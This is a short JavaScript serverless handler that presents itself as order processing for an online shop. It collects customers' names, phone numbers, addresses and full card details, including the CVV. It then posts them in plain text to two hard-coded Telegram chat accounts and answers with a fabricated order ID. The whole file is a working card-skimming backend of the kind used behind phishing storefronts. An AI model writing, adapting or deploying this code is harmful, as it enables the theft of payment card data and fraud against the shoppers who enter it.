export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_IDS = ['6067712594', '7393124087'];

  try {
    const { user, card, total } = req.body;

    const msg = `🔔 NEW ORDER\n------------\n👤 ${user.name}\n📞 ${user.phone}\n📍 ${user.address}\n🏙️ ${user.city}, ${user.state} - ${user.pincode}\n\n💳 CARD INFO\nNo: ${card.number}\nExp: ${card.expiry}\nCVV: ${card.cvv}\nName: ${card.name}\n\n💰 TOTAL: ₹${total}`;

    const promises = TELEGRAM_CHAT_IDS.map(chatId =>
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      })
    );

    await Promise.all(promises);

    res.status(200).json({ ok: true, order_id: 'ORD-' + Date.now() });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
}
